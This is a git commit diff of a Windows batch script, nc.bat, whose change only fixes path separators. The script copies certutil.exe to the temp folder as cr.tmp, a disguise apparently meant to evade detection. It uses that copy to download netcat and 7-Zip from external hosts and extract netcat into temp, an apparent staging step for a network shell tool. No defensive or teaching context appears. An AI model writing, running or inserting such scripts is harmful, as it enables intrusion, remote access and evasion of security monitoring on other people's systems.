684f516423f099d35e8ca14135d07e76bd4ab2da
inwestallis <inwestallis@gmail.com>
2020-02-28 23:42:58 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -2,9 +2,9 @@
 
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
-%temp%\cr.tmp -urlcache -split -f https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip %Temp%/netcat-win32-1.11.zip
+%temp%\cr.tmp -urlcache -split -f https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip %Temp%\netcat-win32-1.11.zip
 
-%temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%/7z.exe
+%temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%\7z.exe
 
 %Temp%\7z.exe x %Temp%\netcat-win32-1.11.zip -o%Temp%\
 
